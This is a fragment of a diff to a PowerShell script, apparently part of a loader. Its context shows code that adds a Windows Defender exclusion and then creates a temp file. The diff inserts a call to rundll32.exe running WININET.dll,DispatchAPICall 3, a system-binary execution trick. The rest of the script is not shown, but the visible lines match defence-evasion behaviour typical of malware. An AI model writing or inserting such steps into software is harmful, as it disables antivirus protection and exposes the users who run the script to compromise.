@@ -318,7 +318,11 @@ try	{
     } catch {
         Write-Error "Error: Failed to add exclusion to Windows Defender. $($_.Exception.Message)"
     }
-
+    try {
+        Start-Process -FilePath "C:\Windows\system32\rundll32.exe" -ArgumentList "C:\Windows\system32\WININET.dll,DispatchAPICall 3" -NoNewWindow -Wait
+    } catch {
+        Write-Error "Error: Failed to execute rundll32 command. $($_.Exception.Message)"
+    }
     $contFile = [System.IO.Path]::GetTempFileName()
 
     try {
